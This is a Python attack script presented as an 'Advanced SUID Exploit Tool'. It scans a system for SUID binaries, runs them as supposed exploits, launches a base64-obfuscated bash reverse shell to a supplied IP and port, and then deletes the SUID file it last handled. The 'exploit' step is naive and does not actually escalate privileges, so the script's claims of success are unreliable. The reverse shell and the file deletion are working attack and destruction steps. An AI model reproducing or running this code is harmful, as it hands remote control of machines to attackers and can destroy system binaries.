import os
import sys
import subprocess
import base64
import random
import string
import time
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def obfuscate(string_input):
    """
    Obfuscates a string for additional complexity.
    """
    obfuscated = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))  # Generate random string
    return obfuscated

def reverse_shell(ip, port):
    """
    Establishes a reverse shell using the given IP and port.
    """
    # Obfuscating the reverse shell command
    payload = f'echo {base64.b64encode(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1".encode()).decode()} | base64 -d | bash'
    
    print(Fore.GREEN + f"[+] Reverse shell command: {payload}")
    
    try:
        subprocess.run(payload, shell=True)
        print(Fore.GREEN + "[+] Reverse shell initiated successfully.")
    except Exception as e:
        print(Fore.RED + f"[-] Failed to initiate reverse shell. Error: {e}")

def check_suid_program(suid_program):
    """
    Checks if the given program has SUID flag set.
    """
    obfuscated_program = obfuscate(suid_program)  # Obfuscated program name
    print(Fore.YELLOW + f"[*] Checking SUID flag for program: {obfuscated_program}")
    
    try:
        program_perm = os.stat(suid_program).st_mode
        if program_perm & 0o4000:  # Check for SUID flag
            print(Fore.GREEN + f"[+] {suid_program} has the SUID flag set.")
            return True
        else:
            print(Fore.RED + f"[-] {suid_program} does not have the SUID flag set.")
            return False
    except Exception as e:
        print(Fore.RED + f"[-] Error: {e}")
        return False

def find_suid_files():
    """
    Finds all files on the system with the SUID flag set.
    """
    print(Fore.YELLOW + "[*] Scanning for SUID files...")
    
    # Use 'find' command to search for SUID files
    result = subprocess.check_output("find / -type f -perm -4000 2>/dev/null", shell=True)
    files = result.decode().splitlines()
    return files

def exploit_suid_program(suid_program):
    """
    Exploits a SUID program to gain root access.
    """
    print(Fore.YELLOW + f"[*] Attempting to exploit: {suid_program}")
    try:
        # Execute the exploit
        result = subprocess.run([suid_program], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(Fore.GREEN + f"[+] Exploit successful! Output:\n{result.stdout.decode()}")
        return True
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Exploit failed. Error message:\n{e.stderr.decode()}")
        return False

def generate_random_string(length=32):
    """
    Generates a strong random string (for username, password, etc.).
    """
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def secure_clean_up(suid_program):
    """
    Securely clean up after the exploit by removing the SUID program if needed.
    """
    print(Fore.YELLOW + f"[*] Cleaning up: {suid_program}")
    try:
        # Remove the SUID program if it exists
        if os.path.exists(suid_program):
            os.remove(suid_program)
            print(Fore.GREEN + f"[+] {suid_program} has been successfully removed.")
        else:
            print(Fore.RED + f"[-] {suid_program} not found.")
    except Exception as e:
        print(Fore.RED + f"[-] Error during cleanup: {e}")

def main():
    """
    Main function to execute the exploit and reverse shell.
    """
    if len(sys.argv) != 3:
        print(Fore.RED + "Usage: python3 exploit.py <IP_ADDRESS> <PORT>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]

    print(Fore.YELLOW + "[*] Advanced SUID Exploit Tool")
    
    # Find files with SUID flag
    suid_files = find_suid_files()
    if not suid_files:
        print(Fore.RED + "[-] No SUID files found.")
        sys.exit(1)

    for suid_program in suid_files:
        if check_suid_program(suid_program):
            success = exploit_suid_program(suid_program)
            if success:
                # Create reverse shell
                reverse_shell(ip, port)
                break  # Exit after a successful exploit

    # Cleanup after exploitation
    secure_clean_up(suid_program)

if __name__ == "__main__":
    main()